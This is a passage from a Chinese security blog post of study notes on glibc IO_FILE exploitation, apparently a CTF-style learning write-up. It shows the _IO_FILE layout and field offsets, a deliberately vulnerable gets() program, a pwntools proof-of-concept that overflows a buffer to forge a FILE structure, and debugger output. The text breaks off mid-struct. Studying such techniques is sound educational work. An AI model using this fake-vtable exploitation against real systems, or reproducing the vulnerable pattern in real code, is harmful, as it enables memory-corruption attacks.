<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="IO_FILE学习笔记" /><meta name="author" content="sirius" /><meta property="og:locale" content="en" /><meta name="description" content="本篇博客重实践，记录一下学习过程、踩坑经历，以及很重要的是我自己对IO_FILE利用的理解。" /><meta property="og:description" content="本篇博客重实践，记录一下学习过程、踩坑经历，以及很重要的是我自己对IO_FILE利用的理解。" /><link rel="canonical" href="https://siriushsh.github.io/posts/IO_FILE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" /><meta property="og:url" content="https://siriushsh.github.io/posts/IO_FILE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" /><meta property="og:site_name" content="SiriusHsh" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-09-15T20:32:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="IO_FILE学习笔记" /><meta name="twitter:site" content="@sirius_hsh" /><meta name="twitter:creator" content="@sirius" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"datePublished":"2022-09-15T20:32:00+08:00","author":{"@type":"Person","name":"sirius"},"dateModified":"2023-03-19T13:16:53+08:00","description":"本篇博客重实践，记录一下学习过程、踩坑经历，以及很重要的是我自己对IO_FILE利用的理解。","url":"https://siriushsh.github.io/posts/IO_FILE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://siriushsh.github.io/posts/IO_FILE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},"headline":"IO_FILE学习笔记","@context":"https://schema.org"}</script><title>IO_FILE学习笔记 | SiriusHsh</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="SiriusHsh"><meta name="application-name" content="SiriusHsh"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/favicons/avatar.JPG" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">SiriusHsh</a></div><div class="site-subtitle font-italic">Enjoy It!</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/SiriusHsh" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/sirius_hsh" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['siriushsh','foxmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>IO_FILE学习笔记</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>IO_FILE学习笔记</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/sirius_hsh">sirius</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2022-09-15 20:32:00 +0800" data-toggle="tooltip" data-placement="bottom" title="Thu, Sep 15, 2022, 8:32 PM +0800" >Sep 15, 2022</em> </span> <span> Updated <em class="timeago" date="2023-03-19 13:16:53 +0800 " data-toggle="tooltip" data-placement="bottom" title="Sun, Mar 19, 2023, 1:16 PM +0800" >Mar 19</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="11031 words"> <em>61 min</em> read</span></div></div></div><div class="post-content"><p>本篇博客重实践，记录一下学习过程、踩坑经历，以及很重要的是我自己对IO_FILE利用的理解。</p><p>File Sturcture的基础知识就不写了，前人们的资料已经非常齐全了，我单独写出来也只会把内容揉碎了，这并不好。</p><ul><li><a href="https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/">abusing-the-file-structure</a><li><a href="https://gsec.hitb.org/materials/sg2018/WHITEPAPERS/FILE%20Structures%20-%20Another%20Binary%20Exploitation%20Technique%20-%20An-Jie%20Yang.pdf">Play with FILE Structure Yet Another Binary Exploitation Technique (whitepaper)</a><li><a href="https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique">Play with FILE Structure Yet Another Binary Exploitation Technique (slide)</a></ul><div class="language-c highlighter-rouge"><div class="code-header"> <span label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
</pre><td class="rouge-code"><pre><span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="p">{</span>
  <span class="kt">int</span> <span class="n">_flags</span><span class="p">;</span>		<span class="cm">/* High-order word is _IO_MAGIC; rest is flags. */</span>
<span class="cp">#define _IO_file_flags _flags
</span>
  <span class="cm">/* The following pointers correspond to the C++ streambuf protocol. */</span>
  <span class="cm">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_read_ptr</span><span class="p">;</span>	<span class="cm">/* Current read pointer */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_read_end</span><span class="p">;</span>	<span class="cm">/* End of get area. */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_read_base</span><span class="p">;</span>	<span class="cm">/* Start of putback+get area. */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_write_base</span><span class="p">;</span>	<span class="cm">/* Start of put area. */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_write_ptr</span><span class="p">;</span>	<span class="cm">/* Current put pointer. */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_write_end</span><span class="p">;</span>	<span class="cm">/* End of put area. */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_buf_base</span><span class="p">;</span>	<span class="cm">/* Start of reserve area. */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_buf_end</span><span class="p">;</span>	<span class="cm">/* End of reserve area. */</span>
  <span class="cm">/* The following fields are used to support backing up and undo. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_base</span><span class="p">;</span> <span class="cm">/* Pointer to start of non-current get area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_backup_base</span><span class="p">;</span>  <span class="cm">/* Pointer to first valid character of backup area */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_end</span><span class="p">;</span> <span class="cm">/* Pointer to end of non-current get area. */</span>

  <span class="k">struct</span> <span class="n">_IO_marker</span> <span class="o">*</span><span class="n">_markers</span><span class="p">;</span>

  <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">_chain</span><span class="p">;</span>

  <span class="kt">int</span> <span class="n">_fileno</span><span class="p">;</span>
<span class="c">#if 0
  int _blksize;
#else</span>
  <span class="kt">int</span> <span class="n">_flags2</span><span class="p">;</span>
<span class="cp">#endif
</span>  <span class="n">_IO_off_t</span> <span class="n">_old_offset</span><span class="p">;</span> <span class="cm">/* This used to be _offset but it's too small.  */</span>

<span class="cp">#define __HAVE_COLUMN </span><span class="cm">/* temporary */</span><span class="cp">
</span>  <span class="cm">/* 1+column number of pbase(); 0 is unknown. */</span>
  <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">_cur_column</span><span class="p">;</span>
  <span class="kt">signed</span> <span class="kt">char</span> <span class="n">_vtable_offset</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">_shortbuf</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>

  <span class="cm">/*  char* _save_gptr;  char* _save_egptr; */</span>

  <span class="n">_IO_lock_t</span> <span class="o">*</span><span class="n">_lock</span><span class="p">;</span>
<span class="cp">#ifdef _IO_USE_OLD_IO_FILE
</span><span class="p">};</span>
</pre></table></code></div></div><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
</pre><td class="rouge-code"><pre><span class="n">_IO_FILE_plus</span> <span class="o">=</span> <span class="p">{</span>
	<span class="s">'i386'</span><span class="p">:{</span>
		<span class="mh">0x0</span><span class="p">:</span><span class="s">'_flags'</span><span class="p">,</span>
		<span class="mh">0x4</span><span class="p">:</span><span class="s">'_IO_read_ptr'</span><span class="p">,</span>
		<span class="mh">0x8</span><span class="p">:</span><span class="s">'_IO_read_end'</span><span class="p">,</span>
		<span class="mh">0xc</span><span class="p">:</span><span class="s">'_IO_read_base'</span><span class="p">,</span>
		<span class="mh">0x10</span><span class="p">:</span><span class="s">'_IO_write_base'</span><span class="p">,</span>
		<span class="mh">0x14</span><span class="p">:</span><span class="s">'_IO_write_ptr'</span><span class="p">,</span>
		<span class="mh">0x18</span><span class="p">:</span><span class="s">'_IO_write_end'</span><span class="p">,</span>
		<span class="mh">0x1c</span><span class="p">:</span><span class="s">'_IO_buf_base'</span><span class="p">,</span>
		<span class="mh">0x20</span><span class="p">:</span><span class="s">'_IO_buf_end'</span><span class="p">,</span>
		<span class="mh">0x24</span><span class="p">:</span><span class="s">'_IO_save_base'</span><span class="p">,</span>
		<span class="mh">0x28</span><span class="p">:</span><span class="s">'_IO_backup_base'</span><span class="p">,</span>
		<span class="mh">0x2c</span><span class="p">:</span><span class="s">'_IO_save_end'</span><span class="p">,</span>
		<span class="mh">0x30</span><span class="p">:</span><span class="s">'_markers'</span><span class="p">,</span>
		<span class="mh">0x34</span><span class="p">:</span><span class="s">'_chain'</span><span class="p">,</span>
		<span class="mh">0x38</span><span class="p">:</span><span class="s">'_fileno'</span><span class="p">,</span>
		<span class="mh">0x3c</span><span class="p">:</span><span class="s">'_flags2'</span><span class="p">,</span>
		<span class="mh">0x40</span><span class="p">:</span><span class="s">'_old_offset'</span><span class="p">,</span>
		<span class="mh">0x44</span><span class="p">:</span><span class="s">'_cur_column'</span><span class="p">,</span>
		<span class="mh">0x46</span><span class="p">:</span><span class="s">'_vtable_offset'</span><span class="p">,</span>
		<span class="mh">0x47</span><span class="p">:</span><span class="s">'_shortbuf'</span><span class="p">,</span>
		<span class="mh">0x48</span><span class="p">:</span><span class="s">'_lock'</span><span class="p">,</span>
		<span class="mh">0x4c</span><span class="p">:</span><span class="s">'_offset'</span><span class="p">,</span>
		<span class="mh">0x54</span><span class="p">:</span><span class="s">'_codecvt'</span><span class="p">,</span>
		<span class="mh">0x58</span><span class="p">:</span><span class="s">'_wide_data'</span><span class="p">,</span>
		<span class="mh">0x5c</span><span class="p">:</span><span class="s">'_freeres_list'</span><span class="p">,</span>
		<span class="mh">0x60</span><span class="p">:</span><span class="s">'_freeres_buf'</span><span class="p">,</span>
		<span class="mh">0x64</span><span class="p">:</span><span class="s">'__pad5'</span><span class="p">,</span>
		<span class="mh">0x68</span><span class="p">:</span><span class="s">'_mode'</span><span class="p">,</span>
		<span class="mh">0x6c</span><span class="p">:</span><span class="s">'_unused2'</span><span class="p">,</span>
		<span class="mh">0x94</span><span class="p">:</span><span class="s">'vtable'</span>
	<span class="p">},</span>

	<span class="s">'amd64'</span><span class="p">:{</span>
		<span class="mh">0x0</span><span class="p">:</span><span class="s">'_flags'</span><span class="p">,</span>
		<span class="mh">0x8</span><span class="p">:</span><span class="s">'_IO_read_ptr'</span><span class="p">,</span>
		<span class="mh">0x10</span><span class="p">:</span><span class="s">'_IO_read_end'</span><span class="p">,</span>
		<span class="mh">0x18</span><span class="p">:</span><span class="s">'_IO_read_base'</span><span class="p">,</span>
		<span class="mh">0x20</span><span class="p">:</span><span class="s">'_IO_write_base'</span><span class="p">,</span>
		<span class="mh">0x28</span><span class="p">:</span><span class="s">'_IO_write_ptr'</span><span class="p">,</span>
		<span class="mh">0x30</span><span class="p">:</span><span class="s">'_IO_write_end'</span><span class="p">,</span>
		<span class="mh">0x38</span><span class="p">:</span><span class="s">'_IO_buf_base'</span><span class="p">,</span>
		<span class="mh">0x40</span><span class="p">:</span><span class="s">'_IO_buf_end'</span><span class="p">,</span>
		<span class="mh">0x48</span><span class="p">:</span><span class="s">'_IO_save_base'</span><span class="p">,</span>
		<span class="mh">0x50</span><span class="p">:</span><span class="s">'_IO_backup_base'</span><span class="p">,</span>
		<span class="mh">0x58</span><span class="p">:</span><span class="s">'_IO_save_end'</span><span class="p">,</span>
		<span class="mh">0x60</span><span class="p">:</span><span class="s">'_markers'</span><span class="p">,</span>
		<span class="mh">0x68</span><span class="p">:</span><span class="s">'_chain'</span><span class="p">,</span>
		<span class="mh">0x70</span><span class="p">:</span><span class="s">'_fileno'</span><span class="p">,</span>
		<span class="mh">0x74</span><span class="p">:</span><span class="s">'_flags2'</span><span class="p">,</span>
		<span class="mh">0x78</span><span class="p">:</span><span class="s">'_old_offset'</span><span class="p">,</span>
		<span class="mh">0x80</span><span class="p">:</span><span class="s">'_cur_column'</span><span class="p">,</span>
		<span class="mh">0x82</span><span class="p">:</span><span class="s">'_vtable_offset'</span><span class="p">,</span>
		<span class="mh">0x83</span><span class="p">:</span><span class="s">'_shortbuf'</span><span class="p">,</span>
		<span class="mh">0x88</span><span class="p">:</span><span class="s">'_lock'</span><span class="p">,</span>
		<span class="mh">0x90</span><span class="p">:</span><span class="s">'_offset'</span><span class="p">,</span>
		<span class="mh">0x98</span><span class="p">:</span><span class="s">'_codecvt'</span><span class="p">,</span>
		<span class="mh">0xa0</span><span class="p">:</span><span class="s">'_wide_data'</span><span class="p">,</span>
		<span class="mh">0xa8</span><span class="p">:</span><span class="s">'_freeres_list'</span><span class="p">,</span>
		<span class="mh">0xb0</span><span class="p">:</span><span class="s">'_freeres_buf'</span><span class="p">,</span>
		<span class="mh">0xb8</span><span class="p">:</span><span class="s">'__pad5'</span><span class="p">,</span>
		<span class="mh">0xc0</span><span class="p">:</span><span class="s">'_mode'</span><span class="p">,</span>
		<span class="mh">0xc4</span><span class="p">:</span><span class="s">'_unused2'</span><span class="p">,</span>
		<span class="mh">0xd8</span><span class="p">:</span><span class="s">'vtable'</span>
	<span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><h2 id="0x01-io_file入门伪造vtable">0x01 IO_FILE入门：伪造vtable<a href="#0x01-io_file入门伪造vtable" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>example.c如下：</p><div class="language-c highlighter-rouge"><div class="code-header"> <span label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="cp">#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;
</span>
<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
<span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
   <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"./file.txt"</span><span class="p">,</span> <span class="s">"rw"</span><span class="p">);</span>
   <span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
   <span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>在glibc2.23下编译，<a href="/assets/file/baby_file">获取样例程序</a></p><p>为了方便调试，把PIE和ASLR关了</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>❯ <span class="nb">cat</span> /proc/sys/kernel/randomize_va_space
0
❯ checksec ./baby_file
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/sirius/ctf/file_structure/baby_file'</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
    RUNPATH:  b<span class="s1">'/home/sirius/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/'</span>
</pre></table></code></div></div><p>程序很明显有一个缓冲区溢出，buf可以溢出，越界写到fp</p><p>利用思路就是越界写fp，使fp指向buf。因为buf是可以随意构造的，就可以随意的伪造file structure了。如下图，buf中全填A时，最后会call fake vtable，fake vtable的地址是AAAAAAAA</p><p><img data-src="/assets/img/2022/image-20221206113503491.png" alt="image-20221206113503491" data-proofer-ignore></p><p>于是poc如下：</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python2
# -*- coding: utf-8 -*-
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./baby_file"</span><span class="p">)</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'split'</span><span class="p">,</span> <span class="s">'-h'</span><span class="p">]</span>
<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">cmd</span><span class="o">=</span><span class="s">''</span><span class="p">):</span>
    <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span>
    <span class="n">pause</span><span class="p">()</span>

<span class="n">debug</span><span class="p">()</span>
<span class="n">buf</span> <span class="o">=</span> <span class="mh">0x601060</span>
<span class="n">p</span> <span class="o">=</span> <span class="s">'a'</span><span class="o">*</span><span class="mh">0x100</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>

<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></table></code></div></div><p>结果失败，没有控制RIP</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="k">*</span>RAX  0x61616161
<span class="k">*</span>RBX  0x601060 <span class="o">(</span>buf<span class="o">)</span> ◂— 0x6161616161616161 <span class="o">(</span><span class="s1">'aaaaaaaa'</span><span class="o">)</span>
<span class="k">*</span>RCX  0x7ffff7dd18e0 <span class="o">(</span>_IO_2_1_stdin_<span class="o">)</span> ◂— 0xfbad2088
<span class="k">*</span>RDX  0x6161616161616161 <span class="o">(</span><span class="s1">'aaaaaaaa'</span><span class="o">)</span>
<span class="k">*</span>RDI  0x601060 <span class="o">(</span>buf<span class="o">)</span> ◂— 0x6161616161616161 <span class="o">(</span><span class="s1">'aaaaaaaa'</span><span class="o">)</span>
<span class="k">*</span>RSI  0x602348 ◂— 0xa /<span class="k">*</span> <span class="s1">'\n'</span> <span class="k">*</span>/
<span class="k">*</span>RBP  0x7fffffffe090 —▸ 0x400630 <span class="o">(</span>__libc_csu_init<span class="o">)</span> ◂— push   r15
<span class="k">*</span>RSP  0x7fffffffe070 ◂— 0x0
<span class="k">*</span>RIP  0x7ffff7a7a39c <span class="o">(</span>fclose+300<span class="o">)</span> ◂— cmp    r8, qword ptr <span class="o">[</span>rdx + 8]
─────────────────────────────[ DISASM <span class="o">]</span>──────────────────────────────
 ► 0x7ffff7a7a39c &lt;fclose+300&gt;    cmp    r8, qword ptr <span class="o">[</span>rdx + 8]
   0x7ffff7a7a3a0 &lt;fclose+304&gt;    je     fclose+370                &lt;fclose+370&gt;
    ↓
   0x7ffff7a7a3e2 &lt;fclose+370&gt;    add    dword ptr <span class="o">[</span>rdx + 4], 1
   0x7ffff7a7a3e6 &lt;fclose+374&gt;    mov    edx, eax
   0x7ffff7a7a3e8 &lt;fclose+376&gt;    and    edx, 0x8000
   0x7ffff7a7a3ee &lt;fclose+382&gt;    <span class="nb">test   </span>ah, 0x20
</pre></table></code></div></div><p>如slide中所讲，需要先bypass掉<code class="language-plaintext highlighter-rouge">_lock</code></p><h3 id="file-structure中_lock的offset获取方法">file structure中_lock的offset获取方法<a href="#file-structure中_lock的offset获取方法" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-shell highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
</pre><td class="rouge-code"><pre>pwndbg&gt; p <span class="k">*</span><span class="o">(</span>struct _IO_FILE_plus <span class="k">*</span><span class="o">)</span> 0x7ffff7dd18e0   <span class="c"># 0x7ffff7dd18e0是stdin地址，如果只是算offset，不关心结构体里内容的话，这个地址可以随便写</span>
<span class="nv">$6</span> <span class="o">=</span> <span class="o">{</span>
  file <span class="o">=</span> <span class="o">{</span>
    _flags <span class="o">=</span> <span class="nt">-72540024</span>,
    _IO_read_ptr <span class="o">=</span> 0x602349 <span class="s2">""</span>,
    _IO_read_end <span class="o">=</span> 0x602349 <span class="s2">""</span>,
    _IO_read_base <span class="o">=</span> 0x602240 <span class="s1">'a'</span> &lt;repeats 200 <span class="nb">times</span><span class="o">&gt;</span>...,
    _IO_write_base <span class="o">=</span> 0x602240 <span class="s1">'a'</span> &lt;repeats 200 <span class="nb">times</span><span class="o">&gt;</span>...,
    _IO_write_ptr <span class="o">=</span> 0x602240 <span class="s1">'a'</span> &lt;repeats 200 <span class="nb">times</span><span class="o">&gt;</span>...,
    _IO_write_end <span class="o">=</span> 0x602240 <span class="s1">'a'</span> &lt;repeats 200 <span class="nb">times</span><span class="o">&gt;</span>...,
    _IO_buf_base <span class="o">=</span> 0x602240 <span class="s1">'a'</span> &lt;repeats 200 <span class="nb">times</span><span class="o">&gt;</span>...,
    _IO_buf_end <span class="o">=</span> 0x603240 <span class="s2">""</span>,
    _IO_save_base <span class="o">=</span> 0x0,
    _IO_backup_base <span class="o">=</span> 0x0,
    _IO_save_end <span class="o">=</span> 0x0,
    _markers <span class="o">=</span> 0x0,
    _chain <span class="o">=</span> 0x0,
    _fileno <span class="o">=</span> 0,
